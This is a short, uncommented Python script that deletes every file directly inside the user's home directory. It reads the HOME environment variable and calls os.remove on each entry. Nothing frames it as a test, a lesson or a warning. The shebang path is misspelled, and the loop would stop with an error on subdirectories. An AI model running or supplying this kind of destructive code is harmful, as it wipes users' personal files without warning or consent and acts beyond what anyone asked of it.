#!/user/bin/python3
######
import os
mydir = os.environ['HOME']
filelist = [f for f in os.listdir(mydir)]
for f in filelist:
    os.remove(os.path.join(mydir, f))
####
